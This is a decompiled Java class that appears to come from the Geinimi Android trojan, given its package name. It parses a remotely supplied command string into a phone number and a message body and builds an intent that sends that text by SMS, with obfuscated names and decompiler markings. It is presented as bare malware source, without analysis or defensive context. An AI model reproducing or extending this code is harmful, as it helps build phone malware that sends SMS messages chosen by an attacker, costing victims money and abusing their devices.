package com.geinimi.ads;

import android.content.Intent;
import android.net.Uri;
import com.geinimi.C0000r;
import com.geinimi.c.j;
import java.net.URLDecoder;

public final class m extends Advertisable {
    private String[] b = {"sms_to_phone", "smc_content"};

    protected m(String str) {
        super(str);
    }

    public final boolean b() {
        return true;
    }

    public final void c() {
        try {
            String substring = this.a.substring(C0000r.j.length());
            a("sms_to_phone", substring.substring(0, substring.indexOf(";")));
            String substring2 = substring.substring(substring.indexOf(";") + 1);
            if (substring2 != null) {
                substring2 = URLDecoder.decode(substring2, "UTF-8");
            }
            a("smc_content", substring2);
        } catch (Exception e) {
        }
    }

    public final int d() {
        return 17301545;
    }

    public final int e() {
        return 17301647;
    }

    public final Intent f() {
        Intent intent = new Intent("android.intent.action.SENDTO", Uri.parse(j.b + a((String) "sms_to_phone")));
        intent.putExtra("sms_body", a((String) "smc_content"));
        return intent;
    }

    /* access modifiers changed from: protected */
    public final String[] h() {
        return this.b;
    }
}
